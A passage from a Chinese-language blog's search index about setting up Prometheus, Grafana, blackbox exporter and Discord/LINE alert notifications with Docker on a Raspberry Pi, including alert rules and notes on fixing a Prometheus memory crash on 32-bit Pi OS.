https://grafana.com/api/plugins/grafana-piechart-panel/versions/1.6.1/download into: /var/lib/grafana/plugins ✔ Installed grafana-piechart-panel successfully Restart grafana after installing plugins . \u003cservice grafana-server restart\u003e [root@prometheus prometheus]# systemctl restart grafana-server.service 參考:解决Panel plugin not found: grafana-piechart-panel - 知我知行 但我這邊是用docker docker-compose exec grafana bash grafana-cli plugins install grafana-piechart-panel 我後來是用這個 dashboard Traefik 2.2 dashboard for Grafana | Grafana Labs 後來發我現docker-traefik-prometheus/config.monitoring at master · vegasbrianc/docker-traefik-prometheus · GitHub GF_INSTALL_PLUGINS=grafana-piechart-panel ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:4:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"process exporter 目前沒用到 是看程式有沒有執行 但目前相對程式都有 exporter 就沒有使用 Prometheus — Process-exporter进程监控 - huandada - 博客园 ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:5:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"Blackbox Exporter 老實說，剛看好難入手 實作完才知道大概在做什麼 簡單來說，所有控制點都在 prometheus blackbox 都是收到接收做事情簡查 不多說，馬上實作 先git clone https://github.com/prometheus/blackbox_exporter.git下來 docker run --rm -d -p 9115:9115 --name blackbox_exporter -v `pwd`:/config prom/blackbox-exporter:master --config.file=/config/blackbox.yml prometheus 設定 - job_name: 'blackbox' metrics_path: /probe params: module: [http_2xx] # Look for a HTTP 200 response. static_configs: - targets: - https://xxx.web # Target to probe with https. relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.1.203:9115 # The blackbox exporter's real hostname:port. - job_name: blackbox-ping metrics_path: /probe params: module: [icmp] static_configs: - targets: - 192.168.1.xx # \u003c== Put here your targets - 192.168.1.xx # \u003c== Put here your targets relabel_configs: # \u003c== This comes from the blackbox exporter README - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.1.203:9115 # Blackbox exporter. 接下來重啟 dokcer-compose restart prometheus 就能解決了 調整為 docker-compose version: '3.3' services: blackbox_exporter: image: prom/blackbox-exporter:master container_name: blackbox_exporter restart: always volumes: - /etc/localtime:/etc/localtime:ro - $PWD:/config command: - '--config.file=/config/blackbox.yml' expose: - '9115' ports: - 9115:9115 參考: How to ping targets using blackbox_exporter with prometheus - Stack Overflow Blackbox Exporter 小記 - Potioneer’s Essays 网络探测：Blackbox Exporter - prometheus-book grafana 7 监控https证书过期时间 - 海口-熟练工 - 博客园 ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:6:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"官方 exporter 清單 Exporters and integrations | Prometheus ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:7:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"安裝 alertmanager-discord 首先 git clone 下來改 arm32v7 映像檔 golang build 參數調整 再 build 看看有沒有問題 git clone https://github.com/benjojo/alertmanager-discord.git Dockerfile build 調整如下 中間有遇到一些狀況 # Built following https://medium.com/@chemidy/create-the-smallest-and-secured-golang-docker-image-based-on-scratch -4752223b7324 # STEP 1 build executable binary FROM arm32v7/golang as builder # Install SSL ca certificates RUN apt update RUN apt install git RUN apt install ca-certificates # Create appuser RUN adduser appuser COPY . $GOPATH/src/mypackage/myapp/ WORKDIR $GOPATH/src/mypackage/myapp/ #get dependancies RUN go get -d -v #build the binary RUN CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=7 go build -a -installsuffix cgo -ldflags=\"-w -s\" -o /go/bin/alertma nager-discord # STEP 2 build a small image # start from scratch FROM hypriot/rpi-alpine-scratch COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/ COPY --from=builder /etc/passwd /etc/passwd # Copy our static executable COPY --from=builder /go/bin/alertmanager-discord /go/bin/alertmanager-discord ENV LISTEN_ADDRESS=0.0.0.0:9094 EXPOSE 9094 USER appuser ENTRYPOINT [\"/go/bin/alertmanager-discord\"] docker build -t alertmanager-discord . 完成，之前我寫的 line 測試的 curl 用在這個會失敗 直接設定到 alertmanager 測試正常 直接docker run 跑起來吧 docker run --rm -d -e DISCORD_WEBHOOK=https://discord.com/api/webhooks/xxxxxxx -p 9094:9094 alertmanager-discord alertmanager/config.yml route: group_by: ['alertname'] group_wait: 10s group_interval: 10s repeat_interval: 10m receiver: discord_webhook receivers: - name: 'live-monitoring' #收邮件的邮箱 email_configs: - to: 'your-email@163.com' - name: 'discord_webhook' webhook_configs: - url: 'http://192.168.1.203:9094' 把一個 exporter 看會不會有任何通知 這邊注意 我用 discord-alertmanager 發現 job_name 不能設定 _樣子 導致有時候發送訊息會異常!! 這邊要注意一下 ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:8:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"接下來學習目標 如何設定 alertmanger 發現 PromQL 還是有學必要 因為設定 alertmanger 必須要會這個東西 還有細項動態設定 label … 先訂好一個大坑 Prometheus監控神器-Rules篇 - ⎝⎛CodingNote.cc ⎞⎠ Alertmanager 紀錄 - 系統工程師 Beck Yeh 的技術分享 alertmanager/template at master · prometheus/alertmanager · GitHub https://www.itread01.com/content/1545670504.html ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:9:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"暫時用的 alertmanager rule 參考一些規則:node_exporter 配置 - 簡書 groups: - name: example rules: # Alert for any instance that is unreachable for \u003e2 minutes. - alert: service_down expr: up == 0 for: 2m labels: severity: page annotations: summary: \"Instance {{ $labels.instance }} down\" description: \"{{ $labels.instance }} of job {{ $labels.job }} has been down for more than 2 minutes.\" - alert: 磁盤容量小於 5% expr: 100 - ((node_filesystem_avail_bytes{job=\"node-exporter\",mountpoint=~\".*\",fstype=~\"ext4|xfs|ext2|ext3\"} * 100) / node_filesystem_size_bytes {job=\"node-exporter\",mountpoint=~\".*\",fstype=~\"ext4|xfs|ext2|ext3\"}) \u003e 95 for: 2m annotations: summary: \"服務器實例 {{ $labels.instance }} 磁盤不足 告警通知\" description: \"{{ $labels.instance }}磁盤 {{ $labels.device }} 資源 已不足 5%, 當前值: {{ $value }}\" - alert: \"內存容量小於 20%\" expr: ((node_memory_MemTotal_bytes - node_memory_MemFree_bytes - node_memory_Buffers_bytes - node_memory_Cached_bytes) / (node_memory_MemTotal_bytes )) * 100 \u003e 80 for: 2m labels: severity: warning annotations: summary: \"服務器實例 {{ $labels.instance }} 內存不足 告警通知\" description: \"{{ $labels.instance }}內存資源已不足 20%,當前值: {{ $value }}\" - alert: \"CPU 平均負載大於 4 個\" expr: node_load5 \u003e 4 for: 2m annotations: sumary: \"服務器實例 {{ $labels.instance }} CPU 負載 告警通知\" description: \"{{ $labels.instance }}CPU 平均負載(5 分鐘) 已超過 4 ,當前值: {{ $value }}\" - alert: \"磁盤讀 I/O 超過 30MB/s\" expr: irate(node_disk_read_bytes_total{device=\"sda\"}[1m]) \u003e 30000000 for: 2m annotations: sumary: \"服務器實例 {{ $labels.instance }} I/O 讀負載 告警通知\" description: \"{{ $labels.instance }}I/O 每分鐘讀已超過 30MB/s,當前值: {{ $value }}\" - alert: \"磁盤寫 I/O 超過 30MB/s\" expr: irate(node_disk_written_bytes_total{device=\"sda\"}[1m]) \u003e 30000000 for: 2m annotations: sumary: \"服務器實例 {{ $labels.instance }} I/O 寫負載 告警通知\" description: \"{{ $labels.instance }}I/O 每分鐘寫已超過 30MB/s,當前值: {{ $value }}\" - alert: \"網卡流出速率大於 10MB/s\" expr: (irate(node_network_transmit_bytes_total{device!~\"lo\"}[1m]) / 1000) \u003e 1000000 for: 2m annotations: sumary: \"服務器實例 {{ $labels.instance }} 網卡流量負載 告警通知\" description: \"{{ $labels.instance }}網卡 {{ $labels.device }} 流量已經超過 10MB/s, 當前值: {{ $value }}\" - alert: \"CPU 使用率大於 90%\" expr: 100 - ((avg by (instance,job,env)(irate(node_cpu_seconds_total{mode=\"idle\"}[2m]))) *100) \u003e 90 for: 2m annotations: sumary: \"服務器實例 {{ $labels.instance }} CPU 使用率 告警通知\" description: \"{{ $labels.instance }}CPU 使用率已超過 90%, 當前值: {{ $value }}\" - alert: SSLCertExpiringSoon expr: probe_ssl_earliest_cert_expiry{job=\"blackbox\"} - time() \u003c 86400 * 30 for: 1d 最後有看到這個網站有一堆 rule 可以參考 Awesome Prometheus alerts | Collection of alerting rules ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:10:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"2021-04-14 發生問題 上 Grafana 看不到 Prometheus 資料 看 log 發現 prometheus | level=info ts=2021-04-14T12:32:25.883Z caller=head.go:768 component=tsdb msg=\"WAL segment loaded\" segment=185 maxSegment=503 prometheus | panic: runtime error: invalid memory address or nil pointer dereference prometheus | [signal SIGSEGV: segmentation violation code=0x1 addr=0xc pc=0x17127f8] prometheus | prometheus | goroutine 590 [running]: prometheus | bufio.(*Writer).Available(...) prometheus | /usr/local/go/src/bufio/bufio.go:624 prometheus | github.com/prometheus/prometheus/tsdb/chunks.(*ChunkDiskMapper).WriteChunk(0x3d39b90, 0x145c, 0x0, 0xcced3c4b, 0x178, 0xcd0878f3, 0x178, 0x26914c4, 0x4712680, 0x0, ...) prometheus | /app/tsdb/chunks/head_chunks.go:291 +0x54c prometheus | github.com/prometheus/prometheus/tsdb.(*memSeries).mmapCurrentHeadChunk(0x49bf340, 0x3d39b90) prometheus | /app/tsdb/head.go:2230 +0x6c prometheus | github.com/prometheus/prometheus/tsdb.(*memSeries).cutNewHeadChunk(0x49bf340, 0xcd08b38b, 0x178, 0x3d39b90, 0x0) prometheus | /app/tsdb/head.go:2204 +0x24 prometheus | github.com/prometheus/prometheus/tsdb.(*memSeries).append(0x49bf340, 0xcd08b38b, 0x178, 0xc1422185, 0x3fe4f164, 0x0, 0x0, 0x3d39b90, 0x10001) prometheus | /app/tsdb/head.go:2360 +0x3a8 prometheus | github.com/prometheus/prometheus/tsdb.(*Head).processWALSamples(0x3d22120, 0xccd1ba00, 0x178, 0x68a2180, 0x68a2140, 0x0, 0x0) prometheus | /app/tsdb/head.go:425 +0x270 prometheus | github.com/prometheus/prometheus/tsdb.(*Head).loadWAL.func5(0x3d22120, 0x416dde0, 0x416ddf0, 0x68a2180, 0x68a2140) prometheus | /app/tsdb/head.go:519 +0x40 prometheus | created by github.com/prometheus/prometheus/tsdb.(*Head).loadWAL prometheus | /app/tsdb/head.go:518 +0x268 prometheus | level=info ts=2021-04-14T12:32:41.305Z caller=main.go:380 msg=\"No time or size retention was set so using the default time retention\" duration=15d 因為我沒有用 healthcheck 後來沒看到有用的 healthcheck web 介面都正常… docker-compose restart 好像都失敗 所以docker-compose down -v 直接清掉重啟就正常… swap 都設2GB RAM 看起來都正常… 後來我猜測是 Prometheus 問題 把 volumes 清掉就正常 ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:11:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"解決樹莓派遇到記憶體問題 2021-12-15 最近在回味重新看這篇時候，發現我沒有補上我調整完設定。不確定新版會不會修正，不過先留個紀錄。 主要是加這段 - '--storage.tsdb.retention.size=500MB'。 留個prometheus docker-compose 紀錄 services: prometheus: image: prom/prometheus-linux-armv7 container_name: prometheus restart: always volumes: - /etc/localtime:/etc/localtime:ro - $PWD/prometheus/:/etc/prometheus/ - prometheus_data:/prometheus command: - '--config.file=/etc/prometheus/prometheus.yml' - '--storage.tsdb.path=/prometheus' - '--web.console.libraries=/usr/share/prometheus/console_libraries' - '--web.console.templates=/usr/share/prometheus/consoles' #- '--storage.tsdb.retention=90d' #- '--storage.tsdb.min-block-duration=2h' #- '--storage.tsdb.max-block-duration=2h' - '--storage.tsdb.retention.size=500MB' networks: - monitoring links: - alertmanager - cadvisor expose: - '9090' ports: - 9090:9090 depends_on: - cadvisor 下面留個失敗紀錄 ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:12:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"失敗紀錄 rpi4 docker panic: mmap, size 134217728: cannot allocate memory · Issue #8661 · prometheus/prometheus · GitHub 後來我有找到這個跟我一樣問題 我目前估計用docker-compose up 執行是跑舊版 後來我跑最新版 但是我沒清掉 volumes 關係?(忘記) 看似 issue 問題也是升級問題 但我是跑到第五天才遇到問題 麻煩的是 alertmanager 沒發通知 很容易沒注意到 確定我過5天後又發生問題 這邊當初我應該不用下docker-compose down -v 應該先 docker-compose stop prometheus docker volume rm (volume_name)才對 2021-04-25 最近又遇到這個問題 查了一下，可能跟 Raspberry PI OS 32 位元有關係 聽說64 位元能解決?!(不確定) 參考: Compaction running out of memory · Issue #7483 · prometheus/prometheus · GitHub 3G memory free yet still panic: mmap: cannot allocate memory · Issue #7450 · prometheus/prometheus · GitHub mmap: cannot allocate memory · Issue #4392 · prometheus/prometheus · GitHub any way to disable sync prometheus configuration? · Issue #3725 · prometheus-operator/prometheus-operator · GitHub Had the same problem. Fixed it by adding a size limit for the storage with –storage.tsdb.retention.size=500MB. Maybe on 32bit systems there could be a default/maximum value for storage.tsdb.retention.size, along with the warning. https://github.com/prometheus/prometheus/issues/7483#issuecomment-670512677 這個我還沒測試 2021-05-03 測試中 Raspberry PI 3 B+ Raspbian Stretch Lite October 2018 prometheus, version 2.4.3+ds (branch: debian/sid, revision: 2.4.3+ds-2) installed from armhf deb package (https://packages.debian.org/sid/net/prometheus) (so I guess no 64bit on 32bit) –storage.tsdb.retention=15y –storage.tsdb.min-block-duration=2h –storage.tsdb.max-block-duration=2h but problem also appears on default settings of min/max block durations. https://github.com/prometheus/prometheus/issues/4392#issuecomment-433717839 Prometheus命令 目前使用這個方案觀察看看 2021-05-03 確定跑到後面會出問題 prometheus: image: prom/prometheus-linux-armv7 container_name: prometheus restart: always volumes: - /etc/localtime:/etc/localtime:ro - $PWD/prometheus/:/etc/prometheus/ - prometheus_data:/prometheus command: - '--config.file=/etc/prometheus/prometheus.yml' - '--storage.tsdb.path=/prometheus' - '--web.console.libraries=/usr/share/prometheus/console_libraries' - '--web.console.templates=/usr/share/prometheus/consoles' - '--storage.tsdb.retention=90d' - '--storage.tsdb.min-block-duration=2h' - '--storage.tsdb.max-block-duration=2h' networks: - monitoring links: - alertmanager - cadvisor expose: - '9090' ports: - 9090:9090 depends_on: - cadvisor ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:12:1","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":["Prometheus"],"content":"首先，最近再找能跑的 prometheus 的 docker-compose 檔案 快速建置流程，體驗裡面介面功能 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:0:0","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"快速實例 使用 GIT 下載 Kev1nChan/docker-prometheus: 使用Docker-compose部署Grafana+Prometheus git clone https://github.com/Kev1nChan/docker-prometheus.git 我找到一個 Github 實例，可以馬上 docker-compose 吃到 Node Exporter 設備 其他 Project 都不能順利執行… 可以先把grafana 版號拿掉，裝最新版 image: grafana/grafana git clone 下來 直接執行 docker-compose up -d 這邊docker-compose.yml可以window 可以把 $PWD 改成. powershell 才不會執行有問題 使用前请修改Grafana配置文件中密码，当前admin密码为qwe123!@# ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:1:0","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"設定 Grafana 新增 DataSource ，選擇 Prometheus 注意!!這邊由於是裝在 docker 裡面 我們這邊 URL 路徑是要輸入 prometheus:9090 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:1:1","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"匯入 Dashboard 很多教學，都沒有說要怎麼匯入別人寫好的 Dashboard 剛用這個新手應該都不會用吧 https://grafana.com/grafana/dashboards/8919 這個網站可以找人加分享好用的 Dashboard 這邊 import 進去來後，記得要選 datasource 這邊 Grafana 就設定完了 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:1:2","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"信箱設定 假設不想用真實信箱，可以用我之前fake stmp email 工具來設定 maildev試用筆記 | 程式狂想筆記 安裝maildev docker run -d -p 1080:80 -p 1025:25 djfarrelly/maildev vim alertmanager/config.yml 設定 stmp 1025, tls = false ，帳號、密碼可以不用理(畢竟是假的…) global: #163服务器 smtp_smarthost: '192.168.1.113:1025' #发邮件的邮箱 smtp_from: 'your-email@foxmail.com' #发邮件的邮箱用户名，也就是你的邮箱　smtp_auth_username: 'your-email@foxmail.com' #发邮件的邮箱密码 smtp_auth_password: 'your-password' #进行tls验证 smtp_require_tls: false route: group_by: ['alertname'] group_wait: 10s group_interval: 10s repeat_interval: 10m receiver: live-monitoring receivers: - name: 'live-monitoring' #收邮件的邮箱 email_configs: - to: 'your-email@163.com' 讓你的 alertmanager 發送 mail 只需要讓你 node_exporter 結束程式就可以了 docker-compose stop node_exporter 執行完，稍後兩分鐘…(因為設定是兩分鐘)，可以看到mail 會發送到maildev 話說 granafan 也有通知功能 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:2:0","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"discord 通知 GitHub - benjojo/alertmanager-discord: Take your alertmanager alerts, into discord 相關建置我後面文章有講到 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:2:1","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"line 通知 [教學] 如何使用 Line Notify 對群組進行通知 | 辛比誌 設定 line notify ，不需要服務登入 https://stackoverflow.com/questions/53372935/how-can-i-config-prometheus-alert-with-line-notify \u003c–這個連結不能使用 TOKEN記得要留著，否則之後不會找到 記得要邀請 line notify 到聊天裡面去 否則不會收到 此帳號尚未被邀請至已連動「測試bot」的群組中。請將此帳號邀請至「去」中。 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:2:2","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"架設 line notify gateway 官方沒推薦使用哪一個line notify 可能國外很少用 這篇有找到line-notify-gateway (2). ใน blog… | by Nont Banditwong | Medium 雖然看不懂裡面文章 但從指令可以看出東西 docker run -d -p 18081:18081 -e line-notify.personal-access-token='{換成你的TOKEN}' --name line-notify-gateway nontster/line-notify-gateway receivers: - name: line-noti webhook_configs: - url: http://192.168.73.161:18081/v1/alertmanager/payload send_resolved: true 測試alertmanager 訊息 curl -H \"Content-type: application/json\" -X POST -d '{\"recei\"status\":\"firing\",\"alerts\":[{\"status\":\"firing\",\"labels\":{\"alertname\":\"InstanceDown\",\"instance\":\"director1:9100\",\"job\":\"ipvs\",\"severity\":\"critical\"},\"annotations\":{\"description\":\"director1:9100 of job ipvs has been down for more than 5 minutes.\",\"summary\":\"Instance director1:9100 down\"},\"startsAt\":\"2019-06-09T09:12:56.795099989Z\",\"endsAt\":\"0001-01-01T00:00:00Z\",\"generatorURL\":\"http://72426f0cd030:9090/graph?g0.expr=up+%3D%3D+0\u0026g0.tab=1\"}],\"groupLabels\":{\"alertname\":\"InstanceDown\"},\"commonLabels\":{\"alertname\":\"InstanceDown\",\"instance\":\"director1:9100\",\"job\":\"ipvs\",\"severity\":\"critical\"},\"commonAnnotations\":{\"description\":\"director1:9100 of job ipvs has been down for more than 5 minutes.\",\"summary\":\"Instance director1:9100 down\"},\"externalURL\":\"http://alertmanager:9093\",\"version\":\"4\",\"groupKey\":\"{}:{alertname=\\\"InstanceDown\\\"}\"}' http://localhost:18081/v1/alertmanager/payload 測試結果可進行運行 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:2:3","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"監控 裡面有內建設定 exporter 服務沒偵測到兩分鐘會發送通知 除了這些外，還有 traefik exporter ,blackbox exporter, 各種 exporter等等 Exporters and integrations | Prometheus 接下來還有很長一段要學習的路 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:3:0","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"使用 vagrant 快速部屬 因為我沒有做 docker-compose 安裝，特別做個快速做出環境。首先必須安裝 vagrant + virtualbox，這邊網路上還滿多的，可以參照網路設定。 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:4:0","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"安裝 vagrant + virtualbox 在 Windows 上安裝 Vagrant 軟體 | 軟體架構・絮語 超詳細的 Vagrant 上手指南 | IT人 使用Vagrant進行伺服器環境部屬 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:4:1","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Prometheus"],"content":"設定 Vagrantfile 執行 vagrant 建立 Vagrantfile Vagrant.configure(\"2\") do |config| # 設定 vm image, 版本,hostname,名稱 config.vm.box = \"bento/ubuntu-18.04\" config.vm.box_version ='201912.14.0' config.vm.hostname = 'dev' config.vm.define vm_name = 'dev' # provision (Shell Script) config.vm.provision \"shell\", privileged: false, inline: \u003c\u003c-SHELL set -e -x -u export DEBIAN_FRONTEND=noninteractive #change the source.list sudo apt-get update sudo apt-get install -y vim git cmake build-essential bash-completion # Install Docker export DOCKER_VERSION=\"5:19.03.5~3-0~ubuntu-bionic\" curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" sudo apt-get update sudo apt-get install -y 